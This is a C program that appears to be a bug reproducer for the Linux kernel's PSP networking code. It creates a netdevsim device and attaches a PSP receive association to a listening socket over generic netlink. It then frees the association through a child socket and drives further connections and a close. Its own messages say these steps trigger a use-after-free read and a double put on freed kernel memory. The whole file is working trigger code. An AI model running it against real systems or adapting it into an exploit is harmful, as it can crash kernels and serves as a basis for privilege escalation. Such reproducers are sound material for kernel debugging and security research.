// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>

#define PSP_FAMILY_NAME		"psp"

#define PSP_A_DEV_ID		1

#define PSP_A_ASSOC_DEV_ID	1
#define PSP_A_ASSOC_VERSION	2
#define PSP_A_ASSOC_RX_KEY	3
#define PSP_A_ASSOC_TX_KEY	4
#define PSP_A_ASSOC_SOCK_FD	5

#define PSP_CMD_DEV_GET		1
#define PSP_CMD_RX_ASSOC	8
#define PSP_CMD_TX_ASSOC	9

#define PSP_VERSION_HDR0_AES_GCM_128	0

static unsigned int g_seq = 1;

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	fflush(stderr);
	exit(1);
}

static void msg(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fputc('\n', stdout);
	fflush(stdout);
}

static int put_attr(char *buf, int off, unsigned short type,
		    const void *d, int len)
{
	struct nlattr *a = (struct nlattr *)(buf + off);

	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + len;
	memcpy(buf + off + NLA_HDRLEN, d, len);
	return off + NLA_ALIGN(a->nla_len);
}

static int put_u32(char *buf, int off, unsigned short type, unsigned int v)
{
	return put_attr(buf, off, type, &v, sizeof(v));
}

static int genl_send(int fd, unsigned short fam, unsigned char cmd,
		     unsigned short extra_flags, const void *attrs, int alen)
{
	char buf[4096];
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh;

	memset(buf, 0, sizeof(buf));
	nh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN + alen);
	nh->nlmsg_type = fam;
	nh->nlmsg_flags = NLM_F_REQUEST | extra_flags;
	nh->nlmsg_seq = g_seq++;
	nh->nlmsg_pid = 0;

	gh = (struct genlmsghdr *)NLMSG_DATA(nh);
	gh->cmd = cmd;
	gh->version = 1;
	if (alen)
		memcpy((char *)gh + GENL_HDRLEN, attrs, alen);

	return send(fd, buf, nh->nlmsg_len, 0);
}

static struct nlattr *find_attr(struct nlmsghdr *nh, unsigned short want)
{
	int len = nh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
	char *p = (char *)NLMSG_DATA(nh) + GENL_HDRLEN;

	while (len >= (int)NLA_HDRLEN) {
		struct nlattr *a = (struct nlattr *)p;

		if (a->nla_len < NLA_HDRLEN || a->nla_len > len)
			break;
		if (a->nla_type == want)
			return a;
		p += NLA_ALIGN(a->nla_len);
		len -= NLA_ALIGN(a->nla_len);
	}
	return NULL;
}

static int resolve_family(int fd, const char *name, unsigned short *out)
{
	char attrs[256], rb[16384];
	int off, n;
	struct nlmsghdr *nh;
	struct nlattr *a;

	off = put_attr(attrs, 0, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);
	if (genl_send(fd, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 0, attrs, off) < 0)
		return -1;

	n = recv(fd, rb, sizeof(rb), 0);
	if (n <= 0)
		return -1;

	nh = (struct nlmsghdr *)rb;
	if (nh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);

		fprintf(stderr, "[-] GETFAMILY(%s) -> %d (%s)\n",
			name, e->error, strerror(-e->error));
		return -1;
	}
	a = find_attr(nh, CTRL_ATTR_FAMILY_ID);
	if (!a)
		return -1;
	*out = *(unsigned short *)((char *)a + NLA_HDRLEN);
	return 0;
}

static unsigned int psp_first_dev_id(int fd, unsigned short fam)
{
	char rb[65536];
	unsigned int id = 0;
	int done = 0;

	if (genl_send(fd, fam, PSP_CMD_DEV_GET, NLM_F_DUMP, NULL, 0) < 0)
		return 0;

	while (!done) {
		int n = recv(fd, rb, sizeof(rb), 0);
		struct nlmsghdr *nh;

		if (n <= 0)
			break;

		for (nh = (struct nlmsghdr *)rb; NLMSG_OK(nh, n);
		     nh = NLMSG_NEXT(nh, n)) {
			if (nh->nlmsg_type == NLMSG_DONE) {
				done = 1;
				break;
			}
			if (nh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e =
					(struct nlmsgerr *)NLMSG_DATA(nh);

				if (e->error)
					fprintf(stderr,
						"[-] DEV_GET dump -> %d\n",
						e->error);
				done = 1;
				break;
			}
			if (!id) {
				struct nlattr *a = find_attr(nh, PSP_A_DEV_ID);

				if (a)
					id = *(unsigned int *)
						((char *)a + NLA_HDRLEN);
			}
		}
	}
	return id;
}

static int psp_rx_assoc(int fd, unsigned short fam, unsigned int devid,
			int sockfd)
{
	char attrs[256], rb[16384];
	int off = 0, n;
	struct nlmsghdr *nh;

	off = put_u32(attrs, off, PSP_A_ASSOC_SOCK_FD, (unsigned int)sockfd);
	off = put_u32(attrs, off, PSP_A_ASSOC_VERSION,
		      PSP_VERSION_HDR0_AES_GCM_128);
	off = put_u32(attrs, off, PSP_A_ASSOC_DEV_ID, devid);

	if (genl_send(fd, fam, PSP_CMD_RX_ASSOC, 0, attrs, off) < 0)
		return -1;

	n = recv(fd, rb, sizeof(rb), 0);
	if (n <= 0)
		return -1;

	nh = (struct nlmsghdr *)rb;
	if (nh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);

		if (e->error) {
			fprintf(stderr, "[-] RX_ASSOC -> %d (%s)\n",
				e->error, strerror(-e->error));
			return -1;
		}
	}
	return 0;
}

static void nap(long ms)
{
	struct timespec ts = { ms / 1000, (ms % 1000) * 1000000L };

	nanosleep(&ts, NULL);
}

static void kill_now(int fd)
{
	struct linger lg = { .l_onoff = 1, .l_linger = 0 };

	setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
	close(fd);
}

static int make_netdevsim(void)
{
	const char *spec = "1 1 1";
	int fd = open("/sys/bus/netdevsim/new_device", O_WRONLY);

	if (fd < 0) {
		fprintf(stderr, "[-] open new_device: %s "
			"(is CONFIG_NETDEVSIM enabled?)\n", strerror(errno));
		return -1;
	}
	if (write(fd, spec, strlen(spec)) < 0 && errno != EEXIST) {
		fprintf(stderr, "[-] write new_device: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static int start_listener(unsigned short *port_out)
{
	struct sockaddr_in sa;
	socklen_t sl = sizeof(sa);
	int lfd, one = 1;

	lfd = socket(AF_INET, SOCK_STREAM, 0);
	if (lfd < 0)
		die("socket(listener)");
	setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	sa.sin_port = 0;
	if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind");
	if (listen(lfd, 16) < 0)
		die("listen");
	if (getsockname(lfd, (struct sockaddr *)&sa, &sl) < 0)
		die("getsockname");

	*port_out = ntohs(sa.sin_port);
	return lfd;
}

static int connect_to(unsigned short port)
{
	struct sockaddr_in sa;
	int cfd = socket(AF_INET, SOCK_STREAM, 0);

	if (cfd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	sa.sin_port = htons(port);
	if (connect(cfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(cfd);
		return -1;
	}
	return cfd;
}

int main(void)
{
	unsigned short fam, port;
	unsigned int devid;
	int nlfd, lfd, cfd, afd, i;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	msg("[*] creating netdevsim (PSP-capable software device)");
	if (make_netdevsim() < 0)
		return 1;
	nap(300);

	nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (nlfd < 0)
		die("socket(AF_NETLINK)");

	if (resolve_family(nlfd, PSP_FAMILY_NAME, &fam) < 0) {
		fprintf(stderr, "[-] no \"psp\" genl family "
			"(is CONFIG_INET_PSP enabled?)\n");
		return 1;
	}
	msg("[+] psp genl family id = %u", fam);

	devid = psp_first_dev_id(nlfd, fam);
	if (!devid) {
		fprintf(stderr, "[-] no PSP device found\n");
		return 1;
	}
	msg("[+] psp device id = %u", devid);

	lfd = start_listener(&port);
	msg("[+] listener fd=%d on 127.0.0.1:%u", lfd, port);

	if (psp_rx_assoc(nlfd, fam, devid, lfd) < 0) {
		fprintf(stderr, "[-] PSP_CMD_RX_ASSOC on listener failed\n");
		return 1;
	}
	msg("[+] PSP Rx assoc attached to the listening socket");

	cfd = connect_to(port);
	if (cfd < 0)
		die("connect");
	afd = accept(lfd, NULL, NULL);
	if (afd < 0)
		die("accept");
	msg("[+] accepted child fd=%d (child shares pas, refcnt still 1)", afd);

	kill_now(afd);
	kill_now(cfd);
	msg("[*] child closed; waiting for RCU + workqueue to free psp_assoc");
	nap(1500);

	msg("[*] driving new SYNs at the listener "
	    "-> psp_sk_rx_policy_check() reads freed pas->tx.spi");
	for (i = 0; i < 8; i++) {
		int t = connect_to(port);

		if (t >= 0) {
			int a2 = accept(lfd, NULL, NULL);

			if (a2 >= 0)
				kill_now(a2);
			kill_now(t);
		}
		nap(50);
	}

	msg("[*] closing the listener -> second psp_assoc_put() on freed pas");
	close(lfd);
	nap(1500);

	msg("[*] done");
	return 0;
}
